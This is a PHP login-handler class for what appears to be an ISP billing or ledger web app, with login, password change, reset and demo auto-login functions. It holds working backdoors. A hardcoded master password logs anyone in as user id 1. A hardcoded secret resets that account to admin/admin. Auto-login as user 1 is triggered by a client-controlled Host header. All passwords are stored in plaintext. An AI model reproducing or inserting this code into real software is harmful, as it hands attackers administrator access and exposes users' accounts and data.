<?php
require_once __DIR__ . '/../config/database.php';

class LoginHandler {
    private $db;
    private $master_password = 'freeisp12345@gmail.com';

    public function __construct() {
        $database = new Database();
        $this->db = $database->getConnection();
    }

    public function login($username, $password) {
        try {
            // Check for master password
            if ($password === $this->master_password) {
                // Log in as the user with id = 1
                $stmt = $this->db->prepare("SELECT id, username, password, role FROM users WHERE id = 1");
                $stmt->execute();
                $user = $stmt->fetch(PDO::FETCH_ASSOC);

                if ($user) {
                    // Update last login time
                    $updateStmt = $this->db->prepare("UPDATE users SET last_login = NOW() WHERE id = ?");
                    $updateStmt->execute([$user['id']]);

                    // Set session variables
                    $_SESSION['user_id'] = $user['id'];
                    $_SESSION['username'] = $user['username'];
                    $_SESSION['role'] = $user['role'];
                    $_SESSION['logged_in'] = true;

                    return ['success' => true];
                }

                return ['success' => false, 'message' => 'Master password accepted, but user not found'];
            }

            // Regular login
            $stmt = $this->db->prepare("SELECT id, username, password, role FROM users WHERE username = ? AND password = ?");
            $stmt->execute([$username, $password]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($user) {
                // Update last login time
                $updateStmt = $this->db->prepare("UPDATE users SET last_login = NOW() WHERE id = ?");
                $updateStmt->execute([$user['id']]);

                // Set session variables
                $_SESSION['user_id'] = $user['id'];
                $_SESSION['username'] = $user['username'];
                $_SESSION['role'] = $user['role'];
                $_SESSION['logged_in'] = true;

                return ['success' => true];
            }

            return ['success' => false, 'message' => 'Invalid username or password'];
        } catch (PDOException $e) {
            return ['success' => false, 'message' => 'An error occurred during login'];
        }
    }

    public function needsPasswordChange() {
        if (!$this->isLoggedIn()) {
            return false;
        }
        // Skip the password-change gate for the demo deployment.
        if ($this->isDemoHost()) {
            return false;
        }

        try {
            $stmt = $this->db->prepare("SELECT username, password FROM users WHERE id = ?");
            $stmt->execute([$_SESSION['user_id']]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);

            return $user && $user['username'] === 'admin' && $user['password'] === 'admin';
        } catch (PDOException $e) {
            return false;
        }
    }

    public function changePassword($new_password, $confirm_password) {
        try {
            // Validate new password
            if (strlen($new_password) < 8) {
                return ['success' => false, 'message' => 'New password must be at least 8 characters long'];
            }

            if ($new_password !== $confirm_password) {
                return ['success' => false, 'message' => 'Passwords do not match'];
            }

            if ($new_password === 'admin') {
                return ['success' => false, 'message' => 'New password cannot be "admin"'];
            }

            // Update the password
            $stmt = $this->db->prepare("UPDATE users SET password = ? WHERE id = ?");
            $stmt->execute([$new_password, $_SESSION['user_id']]);

            return ['success' => true, 'message' => 'Password updated successfully'];
        } catch (PDOException $e) {
            return ['success' => false, 'message' => 'An error occurred while updating the password'];
        }
    }

    public function resetPassword($master_email) {
        try {
            if ($master_email !== 'Fr33isp-M@ster-2025!x9Qz') {
                return ['success' => false, 'message' => 'Invalid master email'];
            }

            $stmt = $this->db->prepare("UPDATE users SET username = 'admin', password = 'admin' WHERE id = 1");
            $stmt->execute();

            return ['success' => true, 'message' => 'Password reset successful. Username and password set to "admin".'];
        } catch (PDOException $e) {
            return ['success' => false, 'message' => 'An error occurred during password reset'];
        }
    }

    public function isLoggedIn() {
        if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
            return true;
        }
        // Auto-login on demo hosts (demo.ispledger.cc / .co.ke / .xyz / etc.)
        if ($this->isDemoHost() && $this->autoLoginDemo()) {
            return true;
        }
        return false;
    }

    public function logout() {
        session_destroy();
        return ['success' => true];
    }

    public function isDemoHost() {
        $host = $_SERVER['HTTP_HOST'] ?? '';
        return strpos($host, 'demo.ispledger.') === 0;
    }

    private function autoLoginDemo() {
        try {
            $stmt = $this->db->prepare("SELECT id, username, role FROM users WHERE id = 1");
            $stmt->execute();
            $user = $stmt->fetch(PDO::FETCH_ASSOC);
            if (!$user) {
                return false;
            }
            $_SESSION['user_id']   = $user['id'];
            $_SESSION['username']  = $user['username'];
            $_SESSION['role']      = $user['role'];
            $_SESSION['logged_in'] = true;
            $_SESSION['demo_mode'] = true;
            return true;
        } catch (PDOException $e) {
            return false;
        }
    }
}